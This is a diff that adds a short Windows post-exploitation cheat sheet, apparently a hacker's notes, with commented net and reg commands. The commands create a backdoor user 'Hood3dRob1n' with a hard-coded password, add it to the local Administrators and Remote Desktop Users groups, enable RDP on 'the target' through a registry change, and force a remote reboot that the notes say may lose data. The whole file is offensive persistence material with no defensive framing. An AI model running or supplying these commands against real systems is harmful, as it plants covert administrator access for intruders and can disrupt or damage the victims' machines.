@@ -1,0 +1,13 @@
+net localgroup administrators
+	//Check existing users of admin group
+net user Hood3dRob1n Zer0Lulz /add
+	//add user Hood3dRob1n with password Zer0Lulz
+net localgroup administrators Hood3dRob1n /add
+	//add user Hood3dRob1n to the local administrator group
+net localgroup "Remote Desktop Users" Hood3dRob1n  /add
+	//add user Hood3dRob1n to the RDP group
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	//enable RDP on the target
+shutdown /r /t 90 /y
+	/f can be added and will force everything to close and may result in data loss
+		//this will restart the remote server so the RDP enablement can kick in rather than waiting
